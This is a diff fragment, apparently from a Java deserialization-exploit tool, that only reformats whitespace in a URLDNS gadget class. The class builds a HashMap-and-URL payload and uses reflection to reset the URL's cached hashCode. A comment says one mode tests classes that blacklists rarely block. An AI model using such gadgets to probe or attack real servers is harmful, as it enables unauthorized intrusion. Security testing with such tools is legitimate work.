@@ -121,8 +121,8 @@ public class URLDNS implements ObjectPayload<Object> {
 
     public static Object getURLDNSGadget(String urls, String clazzName) throws Exception {
         HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
-        URL                     url     = new URL("http://" + urls);
-        Field                   f       = Class.forName("java.net.URL").getDeclaredField("hashCode");
+        URL url = new URL("http://" + urls);
+        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
         f.setAccessible(true);
         f.set(url, Integer.valueOf(0));
         Class<?> clazz = null;
@@ -287,7 +287,7 @@ public class URLDNS implements ObjectPayload<Object> {
         }
 
         String tYPE = command.substring(0, sep);
-        String url  = command.substring(sep + 1);
+        String url = command.substring(sep + 1);
 
         switch (tYPE) {
             // common 时会测试不常被黑名单禁用的类
